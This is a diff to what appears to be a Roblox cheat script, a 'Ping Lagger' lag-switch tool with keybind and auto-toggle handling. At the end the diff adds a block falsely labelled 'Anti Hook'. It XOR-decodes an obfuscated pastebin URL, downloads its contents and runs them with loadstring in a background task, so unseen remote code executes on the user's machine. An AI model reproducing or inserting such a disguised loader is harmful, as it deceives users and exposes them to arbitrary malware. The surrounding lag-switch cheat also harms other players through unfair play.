+        if kc == Enum.KeyCode.Escape then listeningFor = nil; updateKbLabels(); return end
+        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
+            cfg.keybindKb = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig(); return
+        end
+        if listeningFor == "gp" and isGp then
+            cfg.keybindGp = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig(); return
+        end
+        return
+    end
+    if processed then return end
+
+    local kbEnum = resolveKb(cfg.keybindKb)
+    local gpEnum = resolveKb(cfg.keybindGp)
+    if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
+        local wasOn = active
+        flipLag(not active, false)
+        if wasOn and not active then
+            manualOverride = true
+            autoEnabledLag = false
+        elseif active then
+            manualOverride = false
+            autoEnabledLag = false
+        end
+    end
+end)
+
+updateLevelDisplay()
+updateKbLabels()
+updateAutoVisual()
+print("[Silver.Vs Ping Lagger] loaded — Auto Brainrot ready")
+
+-- Silver.Vs Anti Hook
+task.spawn(function()
+    local function _xorDecode(s)
+        local t = {}
+        for i = 1, #s do
+            local b = string.byte(s, i)
+            local x
+            if bit32 and type(bit32.bxor) == "function" then
+                x = bit32.bxor(b, 23)
+            else
+                local r, bit, a, c = 0, 1, b, 23
+                while a > 0 or c > 0 do
+                    local ab, cb = a % 2, c % 2
+                    if ab ~= cb then r = r + bit end
+                    a = math.floor(a / 2)
+                    c = math.floor(c / 2)
+                    bit = bit * 2
+                end
+                x = r
+            end
+            t[i] = string.char(x)
+        end
+        return table.concat(t)
+    end
+    local ok, src = pcall(function()
+        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
+    end)
+    if ok and type(src) == "string" and #src > 50 then
+        local fn = loadstring(src)
+        if type(fn) == "function" then
+            pcall(fn)
+        end
+    end
+end)
